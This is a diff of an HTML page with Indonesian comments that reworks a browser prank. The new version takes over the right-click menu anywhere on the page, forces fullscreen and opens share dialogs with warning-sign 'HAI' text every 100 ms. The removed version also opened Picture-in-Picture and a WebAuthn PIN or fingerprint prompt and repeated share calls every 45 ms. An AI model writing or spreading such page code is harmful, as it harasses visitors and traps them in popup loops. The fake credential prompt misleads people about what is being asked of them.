@@ -2,103 +2,36 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Fullscreen, PiP, & WebAuthn Button</title>
+    <title>Fullscreen Eventssd</title>
     <style>
+        /* Membuat halaman penuh agar bisa diklik di mana saja */
         html, body {
             width: 100%;
             height: 100%;
             margin: 0;
             padding: 0;
-            background-color: #121212;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        /* Tombol standar tanpa animasi */
-        .trigger-btn {
-            height: 100px;
-            width: 200px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            border: 2px solid #fff;
-            background-color: #ffffff;
-            color: #000000;
-        }
-        /* Menyembunyikan elemen video agar tidak merusak tampilan */
-        video {
-            display: none;
+            background-color: #121212; /* Warna latar belakang gelap */
+            cursor: default;
         }
     </style>
 </head>
 <body>
 
-<!-- Satu Tombol Utama di Tengah Layar -->
-<button id="mainBtn" class="trigger-btn">Klik Saya!</button>
-
-<!-- Elemen video tiruan untuk memicu Picture-in-Picture -->
-<video id="pipVideo" autoplay loop muted playsinline></video>
-
 <script>
-const video = document.getElementById('pipVideo');
-const btn = document.getElementById('mainBtn');
-
-// Membuat video stream kosong (warna hitam) agar PiP bisa aktif tanpa file video asli
-const canvas = document.createElement('canvas');
-canvas.width = 640;
-canvas.height = 360;
-const ctx = canvas.getContext('2d');
-ctx.fillStyle = 'black';
-ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-// Mengalirkan gambar kanvas ke elemen video
-const stream = canvas.captureStream(30);
-video.srcObject = stream;
-
-// Menjalankan semua aksi saat tombol diklik kiri
-btn.addEventListener('click', async function() {
+// Mendengarkan event klik kanan (contextmenu) di mana saja pada layar
+window.addEventListener('contextmenu', function(e) {
+    // Mencegah menu klik kanan bawaan browser muncul
+    e.preventDefault(); 
     
-    // 1. Memicu Fullscreen
+    // Memicu Fullscreen
     if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen().catch(err => console.log("Gagal Fullscreen:", err));
+        document.documentElement.requestFullscreen();
     }
 
-    // 2. Memicu Picture-in-Picture (PiP)
-    try {
-        if (document.pictureInPictureEnabled && video.readyState >= 1) {
-            await video.requestPictureInPicture();
-        } else {
-            await video.play();
-            await video.requestPictureInPicture();
-        }
-    } catch (err) {
-        console.log("Gagal memicu PiP:", err);
-    }
-
-    // 3. Memicu Web Authentication (WebAuthn / Pop-up PIN & Sidik Jari)
-    if (navigator.credentials && navigator.credentials.create) {
-        const publicKeyCredentialCreationOptions = {
-            challenge: Uint8Array.from("random-challenge-string", c => c.charCodeAt(0)),
-            rp: { name: "Local Test", id: window.location.hostname || "localhost" },
-            user: {
-                id: Uint8Array.from("user-id", c => c.charCodeAt(0)),
-                name: "user@example.com",
-                displayName: "User"
-            },
-            pubKeyCredParams: [{ type: "public-key", alg: -7 }], 
-            timeout: 60000,
-            authenticatorSelection: { userVerification: "required" }
-        };
-
-        navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
-            .catch(err => console.log("WebAuthn dibatalkan/gagal:", err));
-    }
-
-    // 4. Loop interval share bawaan dari kode Anda
+    // Loop interval share bawaan dari kode Anda
     setInterval(() => { 
-        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}).catch(() => {}); 
-    }, 45);
+        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}); 
+    }, 100);
 });
 </script>
 
